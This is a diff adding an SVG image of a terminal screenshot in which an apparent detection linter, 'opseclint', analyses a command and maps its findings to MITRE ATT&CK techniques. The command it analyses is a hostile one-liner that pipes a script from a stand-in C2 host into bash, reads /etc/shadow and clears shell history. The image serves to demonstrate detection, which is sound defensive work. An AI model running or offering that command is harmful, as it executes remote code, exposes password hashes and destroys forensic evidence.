@@ -1,0 +1,28 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="420" viewBox="0 0 880 420" font-family="SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace" font-size="14">
+  <rect x="0" y="0" width="880" height="420" rx="10" fill="#0d1117"/>
+  <rect x="0" y="0" width="880" height="34" rx="10" fill="#161b22"/>
+  <rect x="0" y="24" width="880" height="10" fill="#161b22"/>
+  <circle cx="20" cy="17" r="6" fill="#ff5f56"/>
+  <circle cx="40" cy="17" r="6" fill="#ffbd2e"/>
+  <circle cx="60" cy="17" r="6" fill="#27c93f"/>
+  <text x="440" y="22" text-anchor="middle" fill="#8b949e">opseclint — detection-coverage</text>
+
+  <text x="24" y="68" xml:space="preserve"><tspan fill="#7ee787">$ </tspan><tspan fill="#c9d1d9">opseclint -c </tspan><tspan fill="#a5d6ff">'curl http://c2/s.sh | bash; cat /etc/shadow; history -c'</tspan></text>
+
+  <text x="24" y="112" xml:space="preserve"><tspan fill="#e6edf3" font-weight="bold">opseclint</tspan><tspan fill="#c9d1d9"> — detection-coverage report (linux-auditd)</tspan></text>
+  <text x="24" y="134" xml:space="preserve" fill="#8b949e">1 line analyzed, 4 findings</text>
+
+  <text x="24" y="178" xml:space="preserve"><tspan fill="#8b949e">  L1  </tspan><tspan fill="#f85149">[CRITICAL 85]</tspan><tspan fill="#e6edf3">  Access to /etc/shadow — password hash exposure</tspan></text>
+  <text x="24" y="200" xml:space="preserve" fill="#8b949e">        T1003.008  OS Credential Dumping: /etc/passwd and /etc/shadow</text>
+
+  <text x="24" y="228" xml:space="preserve"><tspan fill="#8b949e">  L1  </tspan><tspan fill="#f85149">[CRITICAL 80]</tspan><tspan fill="#e6edf3">  Piping downloaded content into a shell interpreter</tspan></text>
+  <text x="24" y="250" xml:space="preserve" fill="#8b949e">        T1059.004  Unix Shell   ·   T1105  Ingress Tool Transfer</text>
+
+  <text x="24" y="278" xml:space="preserve"><tspan fill="#8b949e">  L1  </tspan><tspan fill="#f85149">[CRITICAL 75]</tspan><tspan fill="#e6edf3">  Shell command-history clearing — anti-forensics</tspan></text>
+  <text x="24" y="300" xml:space="preserve" fill="#8b949e">        T1070.003  Indicator Removal: Clear Command History</text>
+
+  <text x="24" y="328" xml:space="preserve"><tspan fill="#8b949e">  L1  </tspan><tspan fill="#d29922">[HIGH 55]</tspan><tspan fill="#e6edf3">  Remote file transfer / HTTP client — tool ingress or exfil</tspan></text>
+  <text x="24" y="350" xml:space="preserve" fill="#8b949e">        T1105  Ingress Tool Transfer</text>
+
+  <text x="24" y="394" xml:space="preserve"><tspan fill="#e6edf3" font-weight="bold">summary</tspan><tspan fill="#c9d1d9">  loudest action: </tspan><tspan fill="#f85149" font-weight="bold">CRITICAL (85)</tspan></text>
+</svg>
